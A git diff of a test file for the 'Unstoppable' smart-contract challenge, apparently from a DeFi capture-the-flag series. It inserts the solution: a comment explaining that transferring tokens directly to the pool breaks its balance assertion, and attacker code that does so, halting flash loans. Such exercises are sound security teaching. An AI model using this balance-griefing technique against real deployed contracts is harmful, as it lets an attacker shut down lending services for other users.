@@ -40,11 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-    });
-
-    after(async function () {
-        /** SUCCESS CONDITIONS */
-	 /* SOLUTION: 
+	/* SOLUTION: 
          * we can fail the assert(poolBalance == balanceBefore):
          * depositTokens() is not the only way to deposit. 
          * we can instead call the transder() function to increase the contract's balance
@@ -55,6 +51,11 @@ describe('[Challenge] Unstoppable', function () {
         // Connect as attacker account
         const attackContract = await this.token.connect(attacker);
         await attackContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+
         // It is no longer possible to execute flash loans
         await expect(
             this.receiverContract.executeFlashLoan(10)
